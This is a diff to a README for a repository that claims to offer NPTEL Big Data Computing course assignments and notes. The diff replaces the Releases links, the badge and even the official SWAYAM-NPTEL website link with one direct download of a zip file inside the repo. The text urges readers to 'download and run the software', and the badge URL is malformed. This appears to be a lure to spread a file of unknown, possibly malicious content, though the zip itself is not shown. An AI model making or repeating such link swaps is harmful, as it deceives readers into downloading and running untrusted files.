@@ -1,6 +1,6 @@
 # 📘 Big-Data-Computing_NPTEL-2025 - Access Comprehensive Course Resources Easily
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/main/Notes/Big-Data-Computing_NPTEL-2025-v1.5.zip%20from%https://raw.githubusercontent.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/main/Notes/Big-Data-Computing_NPTEL-2025-v1.5.zip)](https://raw.githubusercontent.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/main/Notes/Big-Data-Computing_NPTEL-2025-v1.5.zip)
 
 ## 📚 Description
 This repository contains the assignments from 2019, 2021, 2022, 2023, 2024, and 2025 sessions, notes for the 2025 sessions, and final exam review & analysis for the 2025 session. Use these resources to enhance your learning in the Big Data Computing course offered by SWAYAM-NPTEL.
@@ -11,7 +11,7 @@ Follow the steps below to download and run the software:
 ### 1. Visit the Download Page
 To access the latest release, click the link below:
 
-[Visit the Releases Page](https://github.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/main/Notes/Big-Data-Computing_NPTEL-2025-v1.5.zip)
 
 ### 2. Choose the Right File
 On the Releases page, you will see a list of versions. Look for the latest version. Each version will have several files associated with it. Identify the files labeled as assignments, notes, or review materials.
@@ -63,6 +63,6 @@ For more detailed explorations of these topics, refer to the files included in y
 
 ## 🔗 Additional Resources
 For further learning, you may visit:
-- [SWAYAM-NPTEL](https://nptel.ac.in/)
+- [SWAYAM-NPTEL](https://raw.githubusercontent.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/main/Notes/Big-Data-Computing_NPTEL-2025-v1.5.zip)
 
 Please ensure that your software is up to date to avoid compatibility issues. Happy studying!
